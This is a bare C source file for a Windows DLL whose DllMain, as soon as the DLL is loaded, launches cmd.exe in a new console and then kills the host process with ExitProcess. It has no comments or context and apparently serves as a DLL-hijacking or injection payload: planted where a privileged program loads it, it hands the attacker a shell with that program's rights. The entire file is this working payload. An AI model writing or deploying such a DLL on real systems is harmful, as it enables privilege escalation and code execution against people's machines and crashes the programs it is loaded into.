#include <windows.h>

BOOL StartCmd()
{
    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    WCHAR cmdpath[MAX_PATH];

    if (!GetSystemDirectoryW(cmdpath, MAX_PATH - 10))
    {
        return FALSE;
    }
    lstrcatW(cmdpath, L"\\cmd.exe");
    memset(&pi, 0, sizeof(pi));
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_FORCEOFFFEEDBACK | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;
    if(CreateProcessW(NULL, cmdpath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
    {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return TRUE;
    }
    return FALSE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        StartCmd();
        ExitProcess(0);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
